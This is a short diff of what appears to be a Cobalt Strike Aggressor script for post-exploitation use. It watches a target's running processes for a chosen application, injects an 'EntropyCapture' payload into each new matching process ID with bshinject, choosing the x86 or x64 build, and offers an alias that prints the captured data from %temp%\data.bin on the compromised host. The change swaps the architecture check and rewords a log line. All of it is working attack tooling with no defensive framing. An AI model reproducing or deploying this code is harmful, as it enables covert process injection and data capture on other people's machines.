@@ -13,7 +13,6 @@ on heartbeat_5s{
 sub handleProcess{
 	$processList = $2;
 	$index = indexOf($processList, $app, 0) + 9;
-
 	if($index > 9){
 
 		$temp = substr($processList,$index,-1);
@@ -22,11 +21,11 @@ sub handleProcess{
 
 		if ($pid !in @pids){
 			add(@pids,$pid,0);
-			blog($1,"Injecting into PID: $pid");
-			if ($arch eq "x64"){
-				bshinject($1, $pid , "x64" ,script_resource("EntropyCapture_x64.tmp"));
-			} else {
+			blog($1,"Injecting $arch payload into PID: $pid");
+			if ($arch eq "x86"){
 				bshinject($1, $pid , "x86" ,script_resource("EntropyCapture_x86.tmp"));
+			} else {
+				bshinject($1, $pid , "x64" ,script_resource("EntropyCapture_x64.tmp"));
 			}
 			
 		}
@@ -47,4 +46,3 @@ alias stop_entropyCapture {
 alias show_entropyCapture {
 	bshell($1,"type %temp%\\data.bin")
 }
-
